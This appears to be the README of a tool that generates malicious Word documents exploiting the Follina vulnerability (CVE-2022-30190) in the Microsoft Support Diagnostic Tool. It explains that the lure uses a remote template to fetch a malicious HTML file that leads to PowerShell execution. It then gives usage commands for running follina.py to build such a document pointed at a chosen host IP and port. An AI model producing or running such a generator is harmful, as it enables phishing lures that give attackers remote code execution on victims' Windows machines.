Microsoft MSDT Follina Docx generator

The Follina vulnerability in a Windows support tool can be easily exploited by a specially crafted Word document. The lure is outfitted with a remote template that can retrieve a malicious HTML file and ultimately allow an attacker to execute Powershell commands within Windows. 

**CVE-2022-30190**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30190

**Guidance for CVE-2022-30190 Microsoft Support Diagnostic Tool Vulnerability**

https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/

Usage 

`git clone http://thisrepo`

to generate a document using the defaults
(http://127.0.0.1:8000/index.html)

`python follina.py`

to generate a custom document

`python follina.py -f <filename> -h <host ip> -p <hostport>`


